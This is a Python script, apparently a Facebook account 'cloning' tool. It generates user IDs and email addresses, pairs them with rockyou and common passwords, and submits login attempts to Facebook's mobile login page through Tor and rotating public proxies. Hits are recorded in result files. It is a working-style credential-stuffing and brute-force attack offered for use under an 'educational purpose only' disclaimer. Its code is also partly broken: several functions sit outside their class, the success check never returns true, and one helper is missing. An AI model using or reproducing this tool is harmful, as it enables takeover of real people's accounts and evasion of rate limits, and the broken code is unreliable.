#=====[🌿]CREATOR : MAAZ KING
#=====[🌿]TELEGRAM : @LabbaikSupport

import os
import sys
import json
import uuid
import string
import random
import subprocess
import requests
from time import sleep, time
from concurrent.futures import ThreadPoolExecutor


# ===== COLOR CODES =====
R = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;226m'
B = '\x1b[38;5;44m'
P = '\x1b[38;5;201m'
W = '\x1b[0;97m'
N = '\x1b[0m'

PROXY_CACHE_FILE = "results/.proxy_cache.json"
PROXY_EXPIRY = 60 * 60  # 1 hour in seconds

def start_tor():
    try:
        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        sleep(5)
        print(f"{G}[✓] TOR started successfully{N}")
    except Exception as e:
        print(f"{R}[✗] TOR error: {str(e)}{N}")

def fetch_public_proxies():
    try:
        url = "https://www.proxy-list.download/api/v1/get?type=https"
        raw = requests.get(url, timeout=10).text
        return raw.strip().split("\r\n")[:50]
    except Exception as e:
        print(f"{R}[!] Proxy fetch failed → {str(e)}{N}")
        return []

def test_proxy(proxy):
    try:
        r = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
        return proxy if r.status_code == 200 else None
    except:
        return None

def refresh_proxy_cache():
    try:
        print(f"{Y}[~] Refreshing proxy cache...{N}")
        proxies = fetch_public_proxies()
        if not proxies:
            print(f"{R}[!] No proxies found{N}")
            return

        with ThreadPoolExecutor(max_workers=20) as executor:
            tested = executor.map(test_proxy, proxies)
            verified = [p for p in tested if p]

        cache_data = {"timestamp": time(), "proxies": verified}
        os.makedirs("results", exist_ok=True)
        with open(PROXY_CACHE_FILE, "w") as f:
            json.dump(cache_data, f)

        print(f"{G}[✓] {len(verified)} working proxies cached{N}")
    except Exception as e:
        print(f"{R}[✗] Proxy refresh error → {str(e)}{N}")

def load_proxy_cache():
    try:
        if not os.path.exists(PROXY_CACHE_FILE):
            return []
        with open(PROXY_CACHE_FILE) as f:
            data = json.load(f)

        age = time() - data.get("timestamp", 0)
        if age > PROXY_EXPIRY:
            print(f"{Y}[~] Proxy cache expired ({int(age)}s old){N}")
            return []

        return data.get("proxies", [])
    except Exception as e:
        print(f"{R}[!] Proxy cache load failed → {str(e)}{N}")
        return []

def get_proxy_pool():
    return ["socks5://127.0.0.1:9050"] + load_proxy_cache()

def request_with_proxy(url, headers=None, data=None, max_retries=3):
    proxies = get_proxy_pool()
    for _ in range(max_retries):
        proxy = random.choice(proxies)
        try:
            r = requests.post(url, headers=headers, data=data,
                              proxies={"http": proxy, "https": proxy}, timeout=10)
            return r
        except Exception as e:
            print(f"{R}[!] Proxy failed → {str(e)}{N}")
            sleep(1)
    return None


class LogManager:
    @staticmethod
    def save(status, uid, pw):
        from datetime import datetime
        date = datetime.now().strftime("%Y-%m-%d")
        folder = f"results/{status}-{date}.txt"
        if not os.path.exists("results"):
            os.makedirs("results")
        with open(folder, "a", encoding="utf-8") as f:
            f.write(f"{uid}|{pw}\n")
                                               

class MAAZTOOL:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.generated_ids = []
        self.combo_pw_map = {}
        self.chunk_size = 5000
        self.rockyou_path = os.path.expanduser("~/rockyou.txt")
        self.wordlist = self.load_passwords()

    def load_passwords(self):
        combined = []
        if os.path.exists(self.rockyou_path):
            with open(self.rockyou_path, "r", encoding="utf-8", errors="ignore") as f:
                rockyou = [line.strip() for line in f if line.strip()]
                combined += rockyou
        else:
            print(f"{R}[!] rockyou.txt not found at {self.rockyou_path}{N}")
        uuid_passwords = [str(uuid.uuid4())[:8] for _ in range(10)]
        custom_passwords = ['123456', 'admin123', '1234567', 'labbaik786', '12345678', '123456789', 'babygirl', 'iloveu', 'mylove', 'beautiful']
        combined += uuid_passwords + custom_passwords
        return combined

    def smart_passwords(self, uid, wordlist):
        return list(set([
            uid, uid[:6], uid[-6:], uid[-7:], "786786", "123456", "pakistan", "iloveyou"
        ] + wordlist[:5]))

    def ensure_file(self, filename):
        if not os.path.exists(filename):
            with open(filename, "w", encoding="utf-8") as f:
                f.write("")

    def save_result(self, uid, pw, status):
        file_map = {"OK": "ok.txt", "CP": "cp.txt"}
        filename = file_map.get(status, "cp.txt")
        self.ensure_file(filename)
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"{uid}|{pw}\n")


    def banner(self):
        os.system("clear")
        os.system("xdg-open https://chat.whatsapp.com/CFGuz089SUe5npFZDS8iTh")
        print(f"""{G}
███████╗ █████╗ ███████╗███████╗
██╔════╝██╔══██╗╚══███╔╝██╔════╝
█████╗  ███████║  ███╔╝ █████╗  
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
╔══════════════════════════════════╗
║ • Creator  : MAAZ KING           ║
║ • Tools    : MAAZ TOOL           ║
║ • Version  : v2.0                ║
║ • Status   : Free                ║
╚══════════════════════════════════╝
{N}""")
        print(f"{W}USE AT YOUR OWN RISK | EDUCATIONAL PURPOSE ONLY{N}")

    
    def menu(self):
        self.banner()
        print(f"""{G}
[1]  Random Method
[2]  Business Method
[3]  Combo Method
[4]  Dump Method
[5]  Series Method
{N}""")
        choice = input(f"{Y}Select Option ➤ {G}")
        if choice == '1':
            self.random_method()
        elif choice == '2':
            self.business_method()
        elif choice == '3':
            self.combo_method()
        elif choice == '4':
            self.dump_method()
        elif choice == '5':
            self.series_method()
        else:
            print(f"{R}Invalid choice.{N}")
            sys.exit()

    def random_method(self):
        self.banner()
        prefix = ''.join(random.choices(string.digits, k=5))
        limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
        self.generated_ids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)]
        for uid in self.generated_ids:
            for pw in self.smart_passwords(uid, self.wordlist)[:10]:
                print(f"{Y}[→ RANDOM] {uid} | {pw}{N}")
                sleep(0.02)
                self.save_result(uid, pw, "CP")

    def business_method(self):
        self.banner()
        domain = input(f"{Y}Enter Email Domain ➤ {G}")
        limit = int(input(f"{Y}Enter Combo Limit ➤ {G}"))
        self.generated_ids = [f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=7))}@{domain}" for _ in range(limit)]
        for uid in self.generated_ids:
            for pw in self.smart_passwords(uid, self.wordlist):
                print(f"{Y}[→ BUSINESS] {uid} | {pw}{N}")
                sleep(0.02)
                self.save_result(uid, pw, "CP")

    def combo_method(self):
        self.banner()
        if not os.path.exists("combo.txt"):
            print(f"{R}combo.txt not found!{N}")
            return
        self.generated_ids = []
        self.combo_pw_map = {}
        with open("combo.txt", "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                parts = line.strip().split("|")
                if len(parts) == 2:
                    uid, pw = parts
                    self.generated_ids.append(uid)
                    self.combo_pw_map[uid] = pw
        for uid in self.generated_ids:
            pw = self.combo_pw_map[uid]
            print(f"{Y}[→ COMBO] {uid} | {pw}{N}")
            sleep(0.01)
            self.save_result(uid, pw, "OK")

    def dump_method(self):
        self.banner()
        print(f"{Y}Using static UIDs for now...{N}")
        self.generated_ids = ["1000123456789", "1000987654321"]
        for uid in self.generated_ids:
            for pw in self.smart_passwords(uid, self.wordlist)[:8]:
                print(f"{Y}[→ DUMP] {uid} | {pw}{N}")
                sleep(0.02)
                self.save_result(uid, pw, "CP")

    def series_method(self):
        self.banner()
        print(f"""{G}
Select UID Series:
[1] 100001
[2] 100002
[3] 100003
[4] 100004
[5] 100005
{N}""")
        prefix = {'1': '100001', '2': '100002', '3': '100003', '4': '100004', '5': '100005'}.get(input(f"{Y}Select Series ➤ {G}"))
        if not prefix:
            print(f"{R}Invalid series{N}")
            return
        limit = int(input(f"{Y}Enter ID Limit ➤ {G}"))
        self.generated_ids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)]
        for uid in self.generated_ids:
            for pw in self.smart_passwords(uid, self.wordlist):
                print(f"{Y}[→ SERIES] {uid} | {pw}{N}")
                sleep(0.02)
                self.save_result(uid, pw, "CP")


def api_crack_combo(self, uid, passwords):
    """
    Attempts login for UID using provided passwords via proxy.
    Saves OK and CP results using cookie/session inspection.
    """
    login_url = "https://m.facebook.com/login.php"
    for pw in passwords:
        print(f"{Y}[→ COMBO] Trying: {uid} | {pw}{N}")
        sleep(0.1)

        try:
            response = requests.post(
                login_url,
                data={"email": uid, "pass": pw},
                headers={"User-Agent": self.get_ua()},
                proxies={"http": random.choice(get_proxy_pool()), "https": random.choice(get_proxy_pool())},
                timeout=10
            )
        except Exception as e:
            print(f"{R}[!] Proxy Failed or No Response → {str(e)}{N}")
            continue

        cookie = response.headers.get("Set-Cookie", "")
        if self.extract_token_from_cookie(cookie):
            print(f"{G}[✓ OK] {uid} | {pw}{N}")
            LogManager.save("ok", uid, pw)
            self.oks.append(uid)
        else:
            print(f"{R}[✗ CP] {uid} | {pw}{N}")
            LogManager.save("cp", uid, pw)
            self.cps.append(uid)

def api_crack_dump(self, uid, passwords):
    """
    Attempts login for dumped UID using generated passwords.
    Uses proxy rotation and token inspection for CP/OK detection.
    """
    login_url = "https://m.facebook.com/login.php"
    for pw in passwords:
        print(f"{Y}[→ DUMP] Trying: {uid} | {pw}{N}")
        sleep(0.1)

        try:
            response = requests.post(
                login_url,
                data={"email": uid, "pass": pw},
                headers={"User-Agent": self.get_ua()},
                proxies={"http": random.choice(get_proxy_pool()), "https": random.choice(get_proxy_pool())},
                timeout=10
            )
        except Exception as e:
            print(f"{R}[!] Proxy Failed or No Response → {str(e)}{N}")
            continue

        cookie = response.headers.get("Set-Cookie", "")
        if self.extract_token_from_cookie(cookie):
            print(f"{G}[✓ OK] {uid} | {pw}{N}")
            LogManager.save("ok", uid, pw)
            self.oks.append(uid)
        else:
            print(f"{R}[✗ CP] {uid} | {pw}{N}")
            LogManager.save("cp", uid, pw)
            self.cps.append(uid)

def extract_token_from_cookie(self, cookie_str):
    """
    Parses 'Set-Cookie' header from Facebook login response to check
    if login was successful (i.e. session token 'c_user' is present).
    """
    if not cookie_str or not isinstance(cookie_str, str):
        return False


def start_cloning(self, mode):
    try:
        threads = int(input(f"{Y}Enter thread count (e.g., 30, 50) ➤ {G}"))
        print(f"{G}Cloning started using ➤ {mode.upper()} method with {threads} threads{N}")
    except:
        threads = 30
        print(f"{R}[!] Invalid input. Using default threads: 30{N}")

    try:
        with ThreadPoolExecutor(max_workers=threads) as pool:
            for uid in self.generated_ids:
                if mode == "combo" and uid in self.combo_pw_map:
                    pwlist = [self.combo_pw_map[uid]]
                    pool.submit(self.api_crack_combo, uid, pwlist)

                elif mode == "dump":
                    pwlist = self.smart_passwords(uid, self.wordlist)
                    pool.submit(self.api_crack_dump, uid, pwlist)

                elif mode == "random":
                    pwlist = self.smart_passwords(uid, self.wordlist)
                    pool.submit(self.random_method, uid, pwlist)

                elif mode == "business":
                    pwlist = self.smart_passwords(uid, self.wordlist)
                    pool.submit(self.business_method, uid, pwlist)

                elif mode == "series":
                    pwlist = self.smart_passwords(uid, self.wordlist)
                    pool.submit(self.series_method, uid, pwlist)

                else:
                    print(f"{Y}🧢 Skipped ➤ {uid} [Unknown mode: {mode}]{N}")
        self.summary()
    except Exception as e:
        print(f"{R}[!] Thread error: {str(e)}{N}")



if __name__ == "__main__":
    try:
        start_tor()
        refresh_proxy_cache()
        tool = MAAZTOOL()
        tool.menu()
    except KeyboardInterrupt:
        print(f"\n{R}[✗] Interrupted by user. Exiting...{N}")
        sys.exit()
